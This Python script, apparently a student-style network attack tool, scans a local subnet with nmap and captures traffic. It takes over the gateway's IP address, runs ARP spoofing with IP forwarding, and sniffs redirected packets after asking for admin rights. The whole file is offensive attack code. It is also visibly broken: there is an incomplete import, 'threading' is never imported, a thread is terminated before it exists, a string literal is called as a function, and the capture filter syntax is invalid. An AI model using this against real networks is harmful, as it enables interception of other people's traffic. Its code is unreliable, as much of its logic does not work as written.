#Import List
import ipaddress
import nmap
import sys
import admin
import os
from threading import Thread
import scapy.all as scapy

import ARP_Spoofing
import Change_IP_Address
import NetworkDiscovery
from DNS_Spoofing

def Main():
    #IP = NetFunctions.get_ip()

    #ARGV implementation for final revision
    #if sys.argv.len() <= 1:
    #    print("invalid IP Address")
    #    sys.exit()

    IP = '192.168.0.100' #predifined variable values for testing purposes
    Mac = NetworkDiscovery.get_mac_by_ip_SELF(IP)
    MASK = "255.255.255.0"
    Target = "192.168.0.1"
    TargetMac = NetworkDiscovery.get_mac_by_ip(Target, IP)
    Interface = NetworkDiscovery.get_interface_from_ip(IP)

    if len(IP.split()) != 4:
        print("IP Address invalid, check format")
        sys.exit()

    for num in IP.split():
        if (num > 255 or num <= -1 or not (num.int)):
            print("IP Address invalid, check format")
            sys.exit()

    if not Interface:
        print("Interface invalid, check IP Address")
        sys.exit()

    host = ipaddress.IPv4Address(IP)
    net = ipaddress.IPv4Network(IP + '/' + MASK, False)
    #gw = scapy.conf.route.route("0.0.0.0")[2]

    #starts new thread to run the function that gathers the Network traffic
    t1 = threading.Thread(target=NetworkDiscovery.NetCap, args=("test.pcap", NetworkDiscovery.get_interface_from_ip(IP)))
    t1.start()

    try:
       print("Starting Network Host Scan")
       nm = nmap.PortScanner()
       nm.scan(str(net.network_address) + "/24", '1')
       print(nm.all_hosts())
    except KeyboardInterrupt:
       sys.exit()
    except Exception as e: 
       print(f"Network scan failed: {e}")

    print(f"Starting ARP attack against: {Target}")

    IfIPChange=False

    if Target in nm.all_hosts():
        if(IfIPChange==False):
            try:
                t2.terminate()
                NetworkDiscovery.changeIPAddress(Interface, Target, MASK)
                IfIPChange=True

                print("IP Address successfully Changed")

                t1 = Thread(target=NetworkDiscovery.NetCap, args=("test.pcap", NetworkDiscovery.get_interface_from_ip(IP)))
                t1.start()

                t2 = Thread(target=ARP_Spoofing.spoof, args=(Target, IP, TargetMac, Mac))
                t2.start()

            except:
                IfIPChange=False

        if (os.name != 'nt'):
            ARP_Spoofing.enable_ip_forwarding()

        NetworkDiscovery.start_sniffing("8.8.8.8", Interface)

        try:
            scapy.sniff(filter=f"ip.dst == {host}", 
            prn=lambda packet: '"FUNCTION TO SWITCH DESTINATION TO PROPER ADDRESSES"'(packet, Interface),
            iface=Interface)

            scapy.sniff(filter=f"ip.dst == {Target}", 
            prn=lambda packet: '"FUNCTION TO SWITCH DESTINATION TO PROPER ADDRESSES"'(packet, Interface),
            iface=Interface)

        except KeyboardInterrupt: #closes on keyboard interupt
            print("Keyboard Interupt")
            ARP_Spoofing.spoof(Target, IP)(IP, Target, Mac, TargetMac)
            Change_IP_Address.changeIPAddress(Interface, IP, MASK)
            ARP_Spoofing.disable_ip_forwarding()
            t2.join()
            t1.join()
            sys.exit()
        except Exception as e: #closes on exception
            print(f"Arp spoofing failed: {e}")
            ARP_Spoofing.spoof(Target, IP)(IP, Target, Mac, TargetMac)
            Change_IP_Address.changeIPAddress(Interface, IP, MASK)
            ARP_Spoofing.disable_ip_forwarding()
            t2.join()
            t1.join()
            sys.exit()

if __name__ == "__main__": #runs main program and checks for admin privileges
    if not admin.isUserAdmin():
        admin.runAsAdmin()
        print("Requesting Admin privileges")

    else:
        print("Successfully elevated")
        Main()